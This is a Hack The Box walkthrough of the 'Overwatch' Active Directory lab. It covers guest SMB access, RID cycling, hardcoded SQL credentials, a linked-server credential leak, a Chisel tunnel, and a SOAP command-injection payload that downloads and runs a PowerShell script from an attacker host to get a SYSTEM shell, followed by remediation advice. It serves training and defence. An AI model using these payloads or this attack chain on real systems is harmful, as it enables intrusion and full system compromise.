<div align="center">

# 🎯 HTB: Overwatch

![OS](https://img.shields.io/badge/OS-Windows%20AD-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)

`hackthebox` `active-directory` `guest-access` `rid-cycling` `sql-linked-server` `wcf-command-injection`

</div>

---

> **TL;DR** — The guest account can read a share the anonymous session can't, and that share holds a compiled monitoring app with a hardcoded SQL password in plaintext. SQL Server's linked-server config leaks a second, domain-level credential. That gets WinRM access, which finds an internal-only WCF service with a textbook command-injection bug — RCE as `NT AUTHORITY\SYSTEM` on the Domain Controller.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Windows Server 2022 — Domain Controller |
| 🎯 **Target** | `<TARGET_IP>` (overwatch.htb / S200401.overwatch.htb) |
| 🎚️ **Difficulty** | Medium |
| 📅 **Date** | January 26, 2026 |
| 🏁 **Outcome** | ✅ Full domain compromise |

## 🔍 Recon

```bash
nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
```

21 open ports, all the standard AD Domain Controller fare — DNS, Kerberos, LDAP, SMB, RDP, RPC, ADWS. SMB signing is enforced (rules out easy relay attacks), and an RDP cert confirms the hostname `S200401.overwatch.htb`.

---

## 🚩 Foothold Chain — Guest Access → Hardcoded Credentials → Linked-Server Leak

### Guest gets more than anonymous

```bash
netexec smb <TARGET_IP> -u '' -p '' --shares
# STATUS_ACCESS_DENIED — anonymous session blocked from share enumeration

netexec smb <TARGET_IP> -u 'guest' -p '' --shares
```

```
IPC$            READ    Remote IPC
software$       READ
```

> ⚠️ **Root cause:** the built-in guest account is enabled and authenticates with no password. It's not the same as a true null session — and here, it's enough to reach a non-standard share (`software$`) that anonymous access alone couldn't touch.

### RID cycling — the domain, handed over for free

Any username at all, paired with an empty password, authenticates as guest — which is enough to walk the domain's RID space:

```bash
netexec smb <TARGET_IP> -u 'anyuser' -p '' --rid-brute
```

114 objects enumerated: 100 domain users, 6 computer accounts (DC, SQL server, file server, workstations), and two service accounts worth noting — `sqlsvc` and `sqlmgmt`.

### The `software$` share holds a live credential

Inside `software$` sits a compiled .NET monitoring service. Decompiling it (DnsSpy) turns up a hardcoded SQL connection string:

```csharp
new SqlConnection("Server=localhost;Database=SecurityLog;User Id=sqlsvc;Password=Tt0IcsfRzuWvJw")
```

> 💡 A guest-readable share holding a compiled binary is still a credential leak — decompilation is nearly free, and developers routinely forget that "not source code" doesn't mean "not readable."

### SQL Server's linked-server config leaks the next hop

```bash
impacket-mssqlclient sqlsvc:Tt0IcsfRzuWvJw@<TARGET_IP> -windows-auth
```

Enumerating linked servers surfaces a second SQL host (`WINSRV02`) whose stored authentication reveals **domain** credentials for `sqlmgmt`: `REGGIE1234ronnie`.

```bash
evil-winrm -i <TARGET_IP> -u sqlmgmt -p 'REGGIE1234ronnie'
```

Authenticated WinRM access as a real domain user — no more guest tricks needed.

---

## 👑 Root — WCF Command Injection via Tunneled Localhost Service

### Finding the internal-only service

```powershell
netstat -ano | findstr LISTENING
```

Port `8000` is bound to `127.0.0.1` only — invisible from outside, but reachable now that there's a session on the box.

### Tunneling in

```bash
# attacker
./chisel server --reverse -p 9000

# target, via WinRM
.\chisel.exe client <ATTACKER_IP>:9000 R:8000:localhost:8000
```

```bash
curl -H "Host: S200401.overwatch.htb" http://127.0.0.1:8000/MonitorService?wsdl
```

The WSDL reveals a WCF SOAP operation: `KillProcess(string processName)`.

### The injection

The backend builds `cmd.exe /c taskkill /F /IM <processName>` with **no sanitization** — a classic OS command injection (CWE-78), just wrapped in SOAP/XML instead of a URL parameter.

```python
payload = "notepad; IEX(New-Object -TypeName Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1');#"
soap_body = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>{payload}</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>'''
requests.post('http://127.0.0.1:8000/MonitorService', data=soap_body,
  headers={'Host': 'S200401.overwatch.htb', 'SOAPAction': 'http://tempuri.org/IMonitorService/KillProcess'})
```

```bash
nc -nvlp 4444
```

```
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>]
PS C:\Windows\system32> whoami
nt authority\system
```

```powershell
PS> type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG_REDACTED>
```

---

## 🔗 Full Attack Chain

```
Guest SMB access
   → software$ share (guest-readable)
   → hardcoded sqlsvc SQL credential (decompiled binary)
   → SQL linked server leaks sqlmgmt domain credential
   → WinRM as sqlmgmt
   → localhost:8000 WCF service discovered
   → Chisel tunnel exposes it externally
   → SOAP command injection
   → NT AUTHORITY\SYSTEM
```

## 📦 Evidence Index

| ID | Description |
|---|---|
| `EV-001` | Full nmap scan |
| `EV-002` | Guest SMB share enumeration |
| `EV-003` | RID-cycling output (114 AD objects) |
| `EV-004` | Decompiled binary showing hardcoded SQL credential |
| `EV-007` | WCF command injection exploit + SYSTEM shell transcript |

## 🛠️ Remediation

| Finding | Fix |
|---|---|
| Guest account enabled with share access | Disable the guest account domain-wide; audit every share for guest/Everyone permissions. |
| Hardcoded SQL credential in a guest-readable binary | Rotate immediately; never ship credentials in compiled binaries — use gMSAs or a secrets manager. |
| SQL Server linked server exposing plaintext auth | Remove or re-secure linked server configs; audit for credential exposure via `sp_helplinkedsrvlogin`. |
| Unauthenticated, unsanitized WCF command execution | Sanitize/whitelist all input reaching a shell command; require auth on every internal endpoint regardless of network binding. |
| RID cycling exposing the full domain via guest | Restrict anonymous/guest RPC SAM enumeration via GPO (`Network access: Restrict clients allowed to make remote calls to SAM`). |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

</div>
